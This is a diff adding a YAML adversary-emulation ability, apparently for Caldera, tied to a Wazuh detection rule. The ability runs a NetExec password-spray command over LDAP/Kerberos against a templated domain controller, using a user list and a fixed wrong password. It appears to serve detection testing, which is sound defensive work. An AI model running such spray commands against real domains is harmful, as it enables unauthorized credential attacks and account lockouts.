@@ -1,0 +1,18 @@
+- requirements: []
+  name: '[CORP] [Wazuh] [110007] Password Spray usando NetExec (LDAP/Kerberos)'
+  description: "Realiza um ataque de Password Spray contra o DC usando uma lista de\
+    \ usu\xE1rios e uma senha fixa, usando o protocolo LDAP com Kerberos."
+  tactic: credential-access
+  technique_id: T1110.003
+  technique_name: 'Brute Force: Password Spraying'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - nxc.exe
+    parsers: []
+    command: '.\nxc.exe ldap #{corp.domain.dc}.#{corp.domain} -u $PWD\#{corp.domain.users}
+      -p "#{corp.domain.wrongpass}" -d #{corp.domain} -k'
+  id: 90a6c959-ae43-410d-8b5c-79b27cbee1a5
